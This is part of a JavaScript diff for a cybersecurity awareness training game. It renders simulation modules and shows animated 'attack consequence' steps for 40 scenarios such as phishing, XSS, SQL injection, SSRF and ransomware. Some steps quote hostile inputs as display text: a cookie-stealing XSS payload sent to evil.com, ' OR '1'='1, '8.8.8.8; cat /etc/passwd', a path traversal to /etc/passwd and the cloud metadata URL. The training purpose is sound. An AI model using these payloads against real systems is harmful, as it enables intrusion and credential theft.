+      document.getElementById('profile-ratio-text').textContent = `${Math.round(progressPercent)}%`;
+      
+      const circle = document.getElementById('profile-svg-circle');
+      if (circle) {
+        const radius = 40;
+        const circumference = 2 * Math.PI * radius; // 251.2
+        const offset = circumference - (progressPercent / 100) * circumference;
+        circle.style.strokeDashoffset = offset;
+      }
+
+      // Render Achievements
+      renderAchievements();
+      
+      // Render Progress History Table
+      renderHistoryTable();
+    }
+
+    // Tab Navigation Logic
+    function navigateTo(pageId) {
+      playBeep('click');
+      // Hide all main pages
+      const sections = ['page-home', 'page-simulations', 'page-arena', 'page-progress', 'page-profile', 'page-settings'];
+      sections.forEach(id => {
+        const el = document.getElementById(id);
+        if (el) el.classList.add('hidden');
+      });
+
+      // Show target page
+      const targetEl = document.getElementById(`page-${pageId}`);
+      if (targetEl) targetEl.classList.remove('hidden');
+
+      // Update active nav-link highlighting
+      const navLinks = document.querySelectorAll('.nav-link');
+      navLinks.forEach(link => {
+        link.classList.remove('text-cyberPrimary', 'border-b-2', 'border-cyberPrimary');
+        link.classList.add('text-slate-400');
+      });
+
+      // Highlight target link (only for desktop layout buttons)
+      const matchingLink = Array.from(navLinks).find(l => l.getAttribute('onclick').includes(pageId));
+      if (matchingLink) {
+        matchingLink.classList.remove('text-slate-400');
+        matchingLink.classList.add('text-cyberPrimary', 'border-b-2', 'border-cyberPrimary');
+      }
+
+      // Refresh icons for dynamic content
+      lucide.createIcons();
+    }
+
+    // Render Simulation Selection Cards
+    function renderSimulationsGrid() {
+      const grid = document.getElementById('simulations-grid');
+      if (!grid) return;
+      grid.innerHTML = '';
+
+      window.simulationsData.forEach(sim => {
+        const completedNode = userStats.completedList.find(c => c.id === sim.id);
+        const isCompleted = !!completedNode;
+        
+        let difficultyColor = 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20';
+        if (sim.difficulty === 'Intermediate') {
+          difficultyColor = 'bg-amber-500/10 text-amber-400 border-amber-500/20';
+        } else if (sim.difficulty === 'Advanced') {
+          difficultyColor = 'bg-rose-500/10 text-rose-400 border-rose-500/20';
+        }
+
+        const card = document.createElement('div');
+        card.className = `glass-card p-5 rounded-xl border flex flex-col justify-between space-y-4 relative ${isCompleted ? 'border-cyberSecondary/30' : 'border-cyan-500/10'}`;
+        card.innerHTML = `
+          ${isCompleted ? `
+            <div class="absolute top-3 right-3 bg-cyberSecondary/20 text-cyberSecondary border border-cyberSecondary/30 text-[9px] px-2 py-0.5 rounded font-bold font-mono flex items-center">
+              <i data-lucide="check-circle" class="w-3 h-3 mr-1"></i> COMPLETED
+            </div>
+          ` : ''}
+
+          <div class="space-y-3">
+            <div class="w-10 h-10 rounded-lg bg-cyan-500/10 border border-cyberPrimary/20 flex items-center justify-center">
+              <i data-lucide="${sim.icon}" class="w-5 h-5 text-cyberPrimary"></i>
+            </div>
+            <div>
+              <h3 class="text-sm font-bold text-white leading-snug">${sim.id}. ${sim.title}</h3>
+              <p class="text-[11px] text-slate-400 mt-1 line-clamp-2 leading-relaxed">${sim.goal}</p>
+            </div>
+          </div>
+
+          <div class="space-y-3">
+            <div class="flex items-center justify-between text-[10px] text-slate-400 border-t border-slate-800/80 pt-3">
+              <span class="px-2 py-0.5 rounded border ${difficultyColor}">${sim.difficulty}</span>
+              <span class="flex items-center"><i data-lucide="clock" class="w-3 h-3 mr-1"></i> ${sim.time}</span>
+              <span class="text-cyberPrimary font-mono font-bold">+${sim.xp} XP</span>
+            </div>
+            
+            <button onclick="startSimulation(${sim.id})" class="w-full text-center py-2 bg-slate-900 border border-slate-750 hover:bg-cyan-500 hover:text-slate-950 font-bold rounded-lg text-xs transition duration-300 flex items-center justify-center space-x-1 font-mono tracking-wider">
+              <span>LAUNCH MODULE</span>
+              <i data-lucide="chevron-right" class="w-3.5 h-3.5"></i>
+            </button>
+          </div>
+        `;
+        grid.appendChild(card);
+      });
+      lucide.createIcons();
+    }
+
+    // Filter Simulation Matrix
+    function filterSimulations() {
+      const searchVal = document.getElementById('sim-search').value.toLowerCase();
+      const diffVal = document.getElementById('sim-difficulty').value;
+      const cards = document.getElementById('simulations-grid').children;
+      
+      window.simulationsData.forEach((sim, index) => {
+        const card = cards[index];
+        if (!card) return;
+
+        const matchesSearch = sim.title.toLowerCase().includes(searchVal) || sim.goal.toLowerCase().includes(searchVal);
+        const matchesDiff = diffVal === 'all' || sim.difficulty === diffVal;
+
+        if (matchesSearch && matchesDiff) {
+          card.classList.remove('hidden');
+        } else {
+          card.classList.add('hidden');
+        }
+      });
+    }
+
+    // Start Specific Simulation Node
+    function startSimulation(id) {
+      playBeep('click');
+      const sim = window.simulationsData.find(s => s.id === id);
+      if (!sim) return;
+
+      activeSim = sim;
+      activeStepIndex = 0;
+      simChoicesLog = [];
+
+      // Update Arena metadata UI
+      document.getElementById('arena-title').textContent = `${sim.id}. ${sim.title}`;
+      document.getElementById('arena-difficulty').textContent = sim.difficulty;
+      
+      const diffEl = document.getElementById('arena-difficulty');
+      diffEl.className = 'px-2.5 py-0.5 rounded font-semibold text-[10px] ';
+      if (sim.difficulty === 'Beginner') diffEl.classList.add('bg-emerald-500/10', 'text-emerald-400', 'border', 'border-emerald-500/20');
+      else if (sim.difficulty === 'Intermediate') diffEl.classList.add('bg-amber-500/10', 'text-amber-400', 'border', 'border-amber-500/20');
+      else if (sim.difficulty === 'Advanced') diffEl.classList.add('bg-rose-500/10', 'text-rose-400', 'border', 'border-rose-500/20');
+
+      document.getElementById('arena-time').textContent = sim.time;
+      document.getElementById('arena-xp').textContent = sim.xp;
+      document.getElementById('arena-goal').textContent = sim.goal;
+
+      loadActiveStep();
+      navigateTo('arena');
+    }
+
+    // Load active step inside Two-Window Layout
+    function loadActiveStep() {
+      const step = activeSim.steps[activeStepIndex];
+      
+      // Update step progress bar
+      const progressPercent = ((activeStepIndex + 1) / activeSim.steps.length) * 100;
+      document.getElementById('arena-progress-bar').style.width = `${progressPercent}%`;
+
+      document.getElementById('arena-step-desc').textContent = step.description;
+
+      // Render Left/Right Workspace Elements
+      const leftContainer = document.getElementById('arena-left-container');
+      const rightContainer = document.getElementById('arena-right-container');
+
+      leftContainer.innerHTML = step.leftWindowHtml;
+      rightContainer.innerHTML = step.rightWindowHtml;
+
+      // Render Choices Panel
+      const choicesContainer = document.getElementById('arena-choices-container');
+      choicesContainer.innerHTML = '';
+      
+      const feedbackPanel = document.getElementById('arena-feedback-panel');
+      feedbackPanel.classList.add('hidden');
+
+      step.choices.forEach((choice, index) => {
+        const btn = document.createElement('button');
+        btn.className = 'bg-slate-900 hover:bg-slate-850 border border-slate-800 hover:border-cyan-500/30 p-3 rounded-lg text-xs text-left text-slate-300 hover:text-white transition duration-300 font-semibold leading-relaxed relative flex items-start space-x-2.5';
+        btn.innerHTML = `
+          <span class="w-5 h-5 rounded-full bg-slate-850 flex items-center justify-center text-[10px] font-mono text-cyan-400 font-bold border border-cyan-500/20 flex-shrink-0">${String.fromCharCode(65 + index)}</span>
+          <span class="flex-grow">${choice.label}</span>
+        `;
+        btn.onclick = () => selectChoice(index);
+        choicesContainer.appendChild(btn);
+      });
+
+      // Bind specific interactive listeners for Left Window simulations
+      bindSimulationInteractions();
+
+      lucide.createIcons();
+    }
+
+    // Select Choice logic
+    function selectChoice(choiceIndex) {
+      const step = activeSim.steps[activeStepIndex];
+      const choice = step.choices[choiceIndex];
+
+      const feedbackPanel = document.getElementById('arena-feedback-panel');
+      feedbackPanel.innerHTML = '';
+      feedbackPanel.classList.remove('hidden');
+
+      const leftContainer = document.getElementById('arena-left-container');
+      const rightContainer = document.getElementById('arena-right-container');
+
+      // Log answer
+      userStats.historyAnswers.push({ simId: activeSim.id, stepId: step.id, correct: choice.correct });
+
+      if (choice.correct) {
+        playBeep('success');
+        simChoicesLog.push(true);
+
+        // ✅ Show DEFENSE animation in left window
+        leftContainer.innerHTML = `
+          <div class="h-full flex flex-col items-center justify-center bg-emerald-950/30 border border-emerald-500/40 rounded-lg space-y-4 p-6 text-center">
+            <div class="w-16 h-16 rounded-full bg-emerald-500/20 border-2 border-emerald-400 flex items-center justify-center animate-pulse">
+              <i data-lucide="shield-check" class="w-8 h-8 text-emerald-400"></i>
+            </div>
+            <div class="font-mono font-bold text-emerald-400 text-base">✅ DEFENSE ACTIVATED</div>
+            <div class="text-[11px] text-emerald-300 leading-relaxed max-w-xs">${choice.feedback}</div>
+            <div class="bg-emerald-950/50 border border-emerald-800 rounded p-3 text-[10px] font-mono text-emerald-400 w-full text-left space-y-1">
+              <div>[SYSTEM] Threat vector: <span class="text-white">${activeSim.title}</span></div>
+              <div>[STATUS] Attack intercepted and neutralized</div>
+              <div class="text-emerald-300 font-bold">[RESULT] You are safe. 🔒</div>
+            </div>
+          </div>`;
+
+        feedbackPanel.className = 'p-4 rounded-lg bg-emerald-950/20 border border-emerald-500/30 text-xs text-emerald-400 space-y-2';
+        feedbackPanel.innerHTML = `
+          <div class="flex items-center font-bold font-mono">
+            <i data-lucide="check-circle" class="w-4 h-4 mr-1 text-cyberSecondary"></i> SECURE DESTRUCTION PATH CONFIRMED
+          </div>
+          <p>${choice.feedback}</p>
+          <div class="flex justify-end pt-2">
+            <button onclick="advanceStep()" class="bg-cyberSecondary text-slate-950 font-bold px-4 py-1.5 rounded text-[11px] font-mono">CONTINUE &gt;</button>
+          </div>`;
+
+      } else {
+        playBeep('fail');
+        simChoicesLog.push(false);
+
+        // 🚨 Show ATTACK CONSEQUENCE animation in left window
+        const attackSteps = getAttackConsequenceSteps(activeSim.id, choice.label);
+        leftContainer.innerHTML = `
+          <div class="h-full flex flex-col bg-slate-950 rounded-lg border border-red-900/60 overflow-hidden">
+            <div class="bg-red-950/60 border-b border-red-900/50 px-4 py-2 flex items-center justify-between">
+              <div class="flex items-center space-x-2">
+                <div class="w-2.5 h-2.5 rounded-full bg-red-500 animate-ping"></div>
+                <span class="text-red-400 font-mono text-xs font-bold">⚠ ATTACK IN PROGRESS</span>
+              </div>
+              <span class="text-[10px] text-red-400 font-mono">${activeSim.title}</span>
+            </div>
+            <div class="flex-1 p-4 space-y-3 overflow-y-auto" id="attack-log-container">
+              <div class="text-[10px] font-mono text-slate-500">[SIMULATING ATTACK CONSEQUENCE — EDUCATIONAL MODE]</div>
+              ${attackSteps.map((s, i) => `
+                <div class="attack-log-step opacity-0 p-2.5 rounded border border-red-900/40 bg-red-950/20 text-[11px] font-mono" 
+                     style="animation: fadeInStep 0.4s ease forwards; animation-delay: ${i * 0.7}s">
+                  <div class="text-red-400 font-bold">[STEP ${i+1}] ${s.title}</div>
+                  <div class="text-slate-300 mt-1">${s.detail}</div>
+                </div>`).join('')}
+            </div>
+            <div class="bg-red-950/40 border-t border-red-900/40 px-4 py-2 text-center">
+              <div class="text-red-400 font-mono text-[10px] font-bold animate-pulse">🔴 YOUR DATA HAS BEEN COMPROMISED IN THIS SCENARIO</div>
+            </div>
+          </div>`;
+
+        feedbackPanel.className = 'p-4 rounded-lg bg-rose-950/20 border border-rose-500/30 text-xs text-rose-400 space-y-2';
+        feedbackPanel.innerHTML = `
+          <div class="flex items-center font-bold font-mono">
+            <i data-lucide="alert-triangle" class="w-4 h-4 mr-1 text-cyberDanger"></i> THREAT PENETRATION SUCCESSFUL
+          </div>
+          <p>${choice.feedback}</p>
+          <div class="flex justify-end pt-2">
+            <button onclick="advanceStep()" class="bg-slate-800 text-white font-bold px-4 py-1.5 rounded text-[11px] font-mono border border-slate-700">CONTINUE ANYWAY</button>
+          </div>`;
+      }
+      lucide.createIcons();
+    }
+
+    // Generate contextual attack consequence steps based on simulation type
+    function getAttackConsequenceSteps(simId, choiceLabel) {
+      const defaults = [
+        { title: "User Action Registered", detail: "Victim performed the unsafe action..." },
+        { title: "Attacker Server Notified", detail: "Malicious payload was transmitted to remote C2 server." },
+        { title: "Data Exfiltrated", detail: "Sensitive information harvested and stored in attacker database." },
+        { title: "Account Compromised", detail: "Attacker now has full unauthorized access." }
+      ];
+      const map = {
+        "1": [
+                {
+                        "title": "Link Clicked",
+                        "detail": "Victim navigated to paypaI-updates.com"
+                },
+                {
+                        "title": "Credentials Entered",
+                        "detail": "Username & password captured by phishing form"
+                },
+                {
+                        "title": "Exfiltration",
+                        "detail": "Credentials sent to harvester.php on attacker server"
+                },
+                {
+                        "title": "Account Takeover",
+                        "detail": "Attacker logs into real PayPal account"
+                }
+        ],
+        "2": [
+                {
+                        "title": "Fee Paid",
+                        "detail": "$15 sent to attacker crypto wallet"
+                },
+                {
+                        "title": "Blocked",
+                        "detail": "Scammer immediately blocks the victim"
+                },
+                {
+                        "title": "No Prize",
+                        "detail": "There was never any Bitcoin \u2014 total loss of $15"
+                },
+                {
+                        "title": "Card Compromised",
+                        "detail": "Payment method details stored by attacker"
+                }
+        ],
+        "3": [
+                {
+                        "title": "JS Reads Cookie",
+                        "detail": "document.cookie returns session_id=xyz789"
+                },
+                {
+                        "title": "Cookie Sent",
+                        "detail": "XSS script POSTs cookie to evil.com/steal"
+                },
+                {
+                        "title": "Session Cloned",
+                        "detail": "Attacker imports stolen cookie into browser"
+                },
+                {
+                        "title": "Account Hijacked",
+                        "detail": "Attacker browses victim account without password"
+                }
+        ],
+        "4": [
+                {
+                        "title": "Packet Captured",
+                        "detail": "Wireshark intercepts HTTP traffic on open WiFi"
+                },
+                {
+                        "title": "Token Extracted",
+                        "detail": "session_token=abc123xyz found in plain-text headers"
+                },
+                {
+                        "title": "Token Replayed",
+                        "detail": "Attacker imports cookie, bypasses login"
+                },
+                {
+                        "title": "Full Access",
+                        "detail": "Victim account fully accessible to attacker"
+                }
+        ],
+        "5": [
+                {
+                        "title": "Password Entered",
+                        "detail": "Victim types password on g00gIe.com"
+                },
+                {
+                        "title": "Harvested",
+                        "detail": "Form submits credentials to attacker server"
+                },
+                {
+                        "title": "Real Login Attempted",
+                        "detail": "Attacker uses stolen password on google.com"
+                },
+                {
+                        "title": "Account Breached",
+                        "detail": "Gmail, Google Drive, YouTube \u2014 all compromised"
+                }
+        ],
+        "6": [
+                {
+                        "title": "ATM PIN Entered",
+                        "detail": "4-digit PIN transmitted over insecure HTTP"
+                },
+                {
+                        "title": "Card Cloned",
+                        "detail": "Attacker combines PIN + card number for ATM withdrawal"
+                },
+                {
+                        "title": "Cash Withdrawn",
+                        "detail": "Fraudulent ATM withdrawals begin immediately"
+                },
+                {
+                        "title": "Full Financial Loss",
+                        "detail": "Entire account balance drained"
+                }
+        ],
+        "7": [
+                {
+                        "title": "Extension Installed",
+                        "detail": "Malicious addon now runs on all tabs"
+                },
+                {
+                        "title": "Keylogger Active",
+                        "detail": "document.addEventListener captures all typing"
+                },
+                {
+                        "title": "Credentials Captured",
+                        "detail": "Banking passwords, emails sent to remote server"
+                },
+                {
+                        "title": "Identity Theft",
+                        "detail": "All accounts compromised silently in background"
+                }
+        ],
+        "8": [
+                {
+                        "title": "Script Saved",
+                        "detail": "<script>alert(document.cookie)</script> stored in DB"
+                },
+                {
+                        "title": "Other Users Load Page",
+                        "detail": "All visitors receive malicious script in HTML"
+                },
+                {
+                        "title": "Cookies Stolen",
+                        "detail": "Script runs: POSTs all visitor session tokens to attacker"
+                },
+                {
+                        "title": "Mass Account Takeover",
+                        "detail": "Thousands of accounts hijacked via stored XSS"
+                }
+        ],
+        "9": [
+                {
+                        "title": "Injection Sent",
+                        "detail": "' OR '1'='1 bypasses WHERE clause logic"
+                },
+                {
+                        "title": "Query Returns All",
+                        "detail": "SQL returns every user row in database"
+                },
+                {
+                        "title": "Admin Access",
+                        "detail": "Attacker logged in as admin user"
+                },
+                {
+                        "title": "Database Dumped",
+                        "detail": "Full user table exported to attacker machine"
+                }
+        ],
+        "10": [
+                {
+                        "title": "Victim Visits Malicious Page",
+                        "detail": "img src triggers cross-origin GET request"
+                },
+                {
+                        "title": "CSRF Request Fires",
+                        "detail": "Bank transfer executes using victim active cookie"
+                },
+                {
+                        "title": "Money Transferred",
+                        "detail": "$5000 wired to attacker account silently"
+                },
+                {
+                        "title": "No Alert",
+                        "detail": "Victim has no idea until bank statement arrives"
+                }
+        ],
+        "11": [
+                {
+                        "title": "Invisible Overlay Clicked",
+                        "detail": "User thought they clicked Play Video"
+                },
+                {
+                        "title": "Underlying Action Triggered",
+                        "detail": "Hidden iframe button Delete Account received click"
+                },
+                {
+                        "title": "Data Wiped",
+                        "detail": "Victim profile deleted irreversibly"
+                },
+                {
+                        "title": "Trap Successful",
+                        "detail": "Attacker tricked user using opacity layering"
+                }
+        ],
+        "12": [
+                {
+                        "title": "Punycode Resolution",
+                        "detail": "Cyrillic a resolves to xn--80ak6aa.com"
+                },
+                {
+                        "title": "Certificate Trusted",
+                        "detail": "Attacker used free SSL cert for fake domain"
+                },
+                {
+                        "title": "Credentials Submitted",
+                        "detail": "User believed site was genuine due to lock icon"
+                },
+                {
+                        "title": "Account Compromised",
+                        "detail": "Attacker intercepts credentials"
+                }
+        ],
+        "13": [
+                {
+                        "title": "Clipboard Injected",
+                        "detail": "Fake CAPTCHA copied PowerShell script to clipboard"
+                },
+                {
+                        "title": "Run Window Opened",
+                        "detail": "User pressed Win+R & pasted payload as instructed"
+                },
+                {
+                        "title": "Malware Executed",
+                        "detail": "Remote Access Trojan (RAT) installed"
+                },
+                {
+                        "title": "Persistent Backdoor",
+                        "detail": "Attacker gains permanent shell access to PC"
+                }
+        ],
+        "14": [
+                {
+                        "title": "Notifications Allowed",
+                        "detail": "User clicked Allow to view blocked video"
+                },
+                {
+                        "title": "Spam Push Flood",
+                        "detail": "Malicious ad network pushes fake virus alerts"
+                },
+                {
+                        "title": "Tech Support Trap",
+                        "detail": "User calls fake hotline number shown in push"
+                },
+                {
+                        "title": "Remote Access Granted",
+                        "detail": "Victim tricked into giving scammer TeamViewer access"
+                }
+        ],
+        "15": [
+                {
+                        "title": "Fake Installer Downloaded",
+                        "detail": "Chrome_Setup.exe saved from popup"
+                },
+                {
+                        "title": "Executable Launched",
+                        "detail": "User grants UAC administrative privileges"
+                },
+                {
+                        "title": "Ransomware Dropped",
+                        "detail": "Payload encrypts Desktop & Documents"
+                },
+                {
+                        "title": "System Locked",
+                        "detail": "Ransom note demanding 1 BTC displayed"
+                }
+        ],
+        "16": [
+                {
+                        "title": "Extension Hidden",
+                        "detail": "Windows hides extension, file looks like invoice.pdf"
+                },
+                {
+                        "title": "Executable Run",
+                        "detail": "invoice.pdf.exe runs as binary program"
+                },
+                {
+                        "title": "Stealer Executed",
+                        "detail": "Password stealer scans Chrome & Discord tokens"
+                },
+                {
+                        "title": "Credentials Sent",
+                        "detail": "All stored browser passwords sent to Discord Webhook"
+                }
+        ],
+        "17": [
+                {
+                        "title": "Botnet Spraying",
+                        "detail": "Attacker inputs 100,000 leaked email/password pairs"
+                },
+                {
+                        "title": "Reused Password Hit",
+                        "detail": "Same password used on breached site works here"
+                },
+                {
+                        "title": "Account Hijacked",
+                        "detail": "Automated bot logs in & changes email"
+                },
+                {
+                        "title": "Loyalty Points Stolen",
+                        "detail": "Gift cards and reward balances drained"
+                }
+        ],
+        "18": [
+                {
+                        "title": "Web Shell Uploaded",
+                        "detail": "avatar.php.jpg uploaded to image folder"
+                },
+                {
+                        "title": "Extension Bypass",
+                        "detail": "Server executes script via PHP handler"
+                },
+                {
+                        "title": "Remote Command Execution",
+                        "detail": "Attacker runs system commands via web shell"
+                },
+                {
+                        "title": "Server Rooted",
+                        "detail": "Full control of web server acquired"
+                }
+        ],
+        "19": [
+                {
+                        "title": "App Granted Access",
+                        "detail": "User allowed Free PDF Converter OAuth app"
+                },
+                {
+                        "title": "Excessive Scope Granted",
+                        "detail": "App granted read/write access to Google Drive & Mail"
+                },
+                {
+                        "title": "Data Scraped",
+                        "detail": "Attacker API harvests private documents & emails"
+                },
+                {
+                        "title": "Persistent Access",
+                        "detail": "Attacker retains access even if user changes password"
+                }
+        ],
+        "20": [
+                {
+                        "title": "Security Audit Failed",
+                        "detail": "Missing CSP, HSTS, and X-Frame-Options headers"
+                },
+                {
+                        "title": "Vulnerabilities Exposed",
+                        "detail": "Automated scanner discovers outdated plugins"
+                },
+                {
+                        "title": "Exploitation Path Open",
+                        "detail": "Server susceptible to MITM & injection"
+                },
+                {
+                        "title": "System Vulnerable",
+                        "detail": "Site fails baseline compliance security"
+                }
+        ],
+        "21": [
+                {
+                        "title": "Push Spam Flooded",
+                        "detail": "40 push notifications sent to phone at 2 AM"
+                },
+                {
+                        "title": "Victim Weariness",
+                        "detail": "User clicks Approve just to stop buzzing"
+                },
+                {
+                        "title": "MFA Bypassed",
+                        "detail": "Attacker enters portal with password + approved push"
+                },
+                {
+                        "title": "Corporate Network Access",
+                        "detail": "Attacker accesses internal VPN & sensitive drives"
+                }
+        ],
+        "22": [
+                {
+                        "title": "SIM Transferred",
+                        "detail": "Carrier moved phone number to attacker SIM"
+                },
+                {
+                        "title": "SMS Received by Attacker",
+                        "detail": "All OTP codes now go to attacker device"
+                },
+                {
+                        "title": "Password Resets",
+                        "detail": "Bank, email, crypto accounts reset via SMS"
+                },
+                {
+                        "title": "Total Takeover",
+                        "detail": "All accounts hijacked within 10 minutes"
+                }
+        ],
+        "23": [
+                {
+                        "title": "Wire Initiated",
+                        "detail": "Finance team sends $45,000 to attacker account"
+                },
+                {
+                        "title": "Money Moved",
+                        "detail": "Funds transferred to offshore account immediately"
+                },
+                {
+                        "title": "Unrecoverable",
+                        "detail": "International wire transfers are impossible to reverse"
+                },
+                {
+                        "title": "Company Loss",
+                        "detail": "$45,000 gone \u2014 CEO knew nothing about request"
+                }
+        ],
+        "24": [
+                {
+                        "title": "Ransom Paid",
+                        "detail": "5 BTC ($150,000) transferred to attacker wallet"
+                },
+                {
+                        "title": "No Key Provided",
+                        "detail": "Attacker disappears after receiving payment"
+                },
+                {
+                        "title": "Data Still Locked",
+                        "detail": "Files remain encrypted \u2014 payment did not help"
+                },
+                {
+                        "title": "Double Extortion",
+                        "detail": "Attacker threatens to publish stolen data publicly"
+                }
+        ],
+        "25": [
+                {
+                        "title": "Typosquatted Package Installed",
+                        "detail": "Developer ran npm install expresss-utils"
+                },
+                {
+                        "title": "Malicious Postinstall Script",
+                        "detail": "Package runs payload during installation"
+                },
+                {
+                        "title": "API Keys Harvested",
+                        "detail": "ENV variables containing AWS & Stripe keys stolen"
+                },
+                {
+                        "title": "Cloud Account Hijacked",
+                        "detail": "Attacker spawns crypto mining EC2 instances"
+                }
+        ],
+        "26": [
+                {
+                        "title": "Parameter Altered",
+                        "detail": "User changed URL from /account?id=101 to /account?id=102"
+                },
+                {
+                        "title": "Authorization Check Missing",
+                        "detail": "Backend returns data without verifying ownership"
+                },
+                {
+                        "title": "PII Data Exposed",
+                        "detail": "Attacker views personal details of user #102"
+                },
+                {
+                        "title": "Mass Data Exfiltration",
+                        "detail": "Script iterates through all user IDs 1 to 10,000"
+                }
+        ],
+        "27": [
+                {
+                        "title": "Internal URL Submitted",
+                        "detail": "User inputs http://169.254.169.254/latest/meta-data/"
+                },
+                {
+                        "title": "Cloud Metadata Fetched",
+                        "detail": "Vulnerable server queries AWS IMDS endpoint"
+                },
+                {
+                        "title": "IAM Credentials Leaked",
+                        "detail": "Temporary AWS secret access key returned"
+                },
+                {
+                        "title": "Cloud Infrastructure Compromised",
+                        "detail": "Attacker uses IAM key to access S3 buckets"
+                }
+        ],
+        "28": [
+                {
+                        "title": "Malicious Input Appended",
+                        "detail": "Input 8.8.8.8; cat /etc/passwd submitted"
+                },
+                {
+                        "title": "Unsanitized Shell Execution",
+                        "detail": "Server executes command via system()"
+                },
+                {
+                        "title": "System File Disclosed",
+                        "detail": "Sensitive user account file printed to response"
+                },
+                {
+                        "title": "Remote Code Execution",
+                        "detail": "Attacker spawns interactive reverse shell"
+                }
+        ],
+        "29": [
+                {
+                        "title": "Relative Directory Path Sent",
+                        "detail": "Input ../../../../etc/passwd submitted"
+                },
+                {
+                        "title": "File Sanitization Missing",
+                        "detail": "Server reads outside web root directory"
+                },
+                {
+                        "title": "System Secrets Disclosed",
+                        "detail": "Server configuration & shadow files read"
+                },
+                {
+                        "title": "Server Security Breached",
+                        "detail": "Attacker obtains system cryptographic keys"
+                }
+        ],
+        "30": [
+                {
+                        "title": "Algorithm Changed to none",
+                        "detail": "Attacker modifies JWT header alg: none"
+                },
+                {
+                        "title": "Signature Stripped",
+                        "detail": "Token signature removed before request"
+                },
+                {
+                        "title": "Insecure Verification",
+                        "detail": "Server accepts unsigned JWT token"
+                },
+                {
+                        "title": "Admin Privileges Forged",
+                        "detail": "Attacker escalates privileges to system admin"
+                }
+        ],
+        "31": [
+                {
+                        "title": "Request Flood Sent",
+                        "detail": "10,000 HTTP requests per second sent to API endpoint"
+                },
+                {
+                        "title": "Rate Limiting Missing",
+                        "detail": "Server attempts to process every request"
+                },
+                {
+                        "title": "Database Connection Pool Exhausted",
+                        "detail": "DB drops all active connections"
+                },
+                {
+                        "title": "Outage Caused",
+                        "detail": "Legitimate users blocked by service crash"
+                }
+        ],
+        "32": [
+                {
+                        "title": "Unsafe Redirect Parameter",
+                        "detail": "User clicks site.com/login?redirect=http://evil.com"
+                },
+                {
+                        "title": "Domain Validation Missing",
+                        "detail": "Server redirects user to untrusted site after login"
+                },
+                {
+                        "title": "Phishing Landing Page",
+                        "detail": "Evil.com mimics site.com to steal secondary credentials"
+                },
+                {
+                        "title": "User Tricked",
+                        "detail": "User trusts link because it started on site.com"
+                }
+        ],
+        "33": [
+                {
+                        "title": "Dynamic Script Tag Included",
+                        "detail": "Attacker site includes script tag pointing to user.json"
+                },
+                {
+                        "title": "Auth Cookie Sent Automatically",
+                        "detail": "Browser includes session cookie with GET request"
+                },
+                {
+                        "title": "Response Intercepted",
+                        "detail": "Attacker reads private JSON data via window prototype"
+                },
+                {
+                        "title": "Sensitive Profile Leaked",
+                        "detail": "Financial and email details harvested"
+                }
+        ],
+        "34": [
+                {
+                        "title": "Fake AP Connected",
+                        "detail": "Device auto-connects to unencrypted Airport_Free_WiFi"
+                },
+                {
+                        "title": "Man-In-The-Middle Active",
+                        "detail": "Attacker controls DNS & routes all traffic"
+                },
+                {
+                        "title": "SSL Stripping Performed",
+                        "detail": "HTTPS downgraded to HTTP on sensitive portals"
+                },
+                {
+                        "title": "Credentials Sniffed",
+                        "detail": "Plaintext credentials captured over airwaves"
+                }
+        ],
+        "35": [
+                {
+                        "title": "SMS Delivery Alert Clicked",
+                        "detail": "Text says Package on hold! Click link to pay $1.99"
+                },
+                {
+                        "title": "Card Details Entered",
+                        "detail": "Credit card number, CVV, and expiry submitted"
+                },
+                {
+                        "title": "Card Enrolled in Apple Pay",
+                        "detail": "Fraudulent high-value purchases initiated"
+                },
+                {
+                        "title": "Banking Fraud Triggered",
+                        "detail": "Thousands stolen before card is cancelled"
+                }
+        ],
+        "36": [
+                {
+                        "title": "Fake Bank Call Received",
+                        "detail": "AI voice clone of bank agent requests 2FA code"
+                },
+                {
+                        "title": "OTP Code Read Aloud",
+                        "detail": "Victim reads 6-digit SMS code to caller"
+                },
+                {
+                        "title": "Real-Time Login Executed",
+                        "detail": "Scammer inputs OTP into legitimate bank portal"
+                },
+                {
+                        "title": "Instant Funds Drain",
+                        "detail": "Money transferred out of victim checking account"
+                }
+        ],
+        "37": [
+                {
+                        "title": "Plain MD5 Hash Dumped",
+                        "detail": "DB breach exposes unsalted MD5 password hashes"
+                },
+                {
+                        "title": "Rainbow Table Lookup",
+                        "detail": "Attacker matches 99% of hashes in seconds"
+                },
+                {
+                        "title": "Cracked Passwords Used",
+                        "detail": "Attacker tests cracked passwords on user emails"
+                },
+                {
+                        "title": "Mass Account Breach",
+                        "detail": "Thousands of user accounts compromised across web"
+                }
+        ],
+        "38": [
+                {
+                        "title": "Orphaned CNAME Pointed",
+                        "detail": "blog.company.com points to deleted GitHub Pages repo"
+                },
+                {
+                        "title": "Attacker Claims Subdomain",
+                        "detail": "Attacker creates GitHub repo matching old CNAME"
+                },
+                {
+                        "title": "Subdomain Hijacked",
+                        "detail": "Attacker serves malicious content on company subdomain"
+                },
+                {
+                        "title": "Session Cookies Stolen",
+                        "detail": "Attacker captures domain-wide authentication cookies"
+                }
+        ],
+        "39": [
+                {
+                        "title": "Wildcard Origin with Credentials",
+                        "detail": "Server sends Access-Control-Allow-Origin: * with credentials"
+                },
+                {
+                        "title": "Malicious Site Queries API",
+                        "detail": "Evil.com makes authenticated AJAX calls to API"
+                },
+                {
+                        "title": "Private API Response Read",
+                        "detail": "Victim sensitive data read by evil.com script"
+                },
+                {
+                        "title": "Full Account Read Access",
+                        "detail": "Attacker reads inbox, settings, & financial data"
+                }
+        ],
+        "40": [
+                {
+                        "title": "Perimeter-Only Security",
+                        "detail": "Internal network trusted implicitly once inside"
+                },
+                {
+                        "title": "Lateral Movement Executed",
+                        "detail": "Attacker pivots from printer to domain controller"
+                },
+                {
+                        "title": "No Continuous Authentication",
+                        "detail": "Access never re-verified after initial login"
+                },
+                {
+                        "title": "Enterprise Network Fallen",
+                        "detail": "Entire corporate infrastructure compromised"
+                }
+        ]
+};
+      return map[simId] || defaults;
+    }
+
+    // Advance simulation step or complete level
+    function advanceStep() {
+      playBeep('click');
+      if (activeStepIndex + 1 < activeSim.steps.length) {
+        activeStepIndex++;
+        loadActiveStep();
+      } else {
+        completeSimulation();
+      }
+    }
+
+    // Complete active simulation level
+    function completeSimulation() {
+      // Calculate correct choices count
+      const correctCount = simChoicesLog.filter(c => c === true).length;
+      const totalCount = simChoicesLog.length;
+      
+      // Calculate stars earned
+      let stars = 1;
+      if (correctCount === totalCount) stars = 3;
+      else if (correctCount >= totalCount / 2) stars = 2;
+
+      // Add stats XP
+      const xpEarned = activeSim.xp;
+      userStats.xp += xpEarned;
+
+      // Add to completed registry list
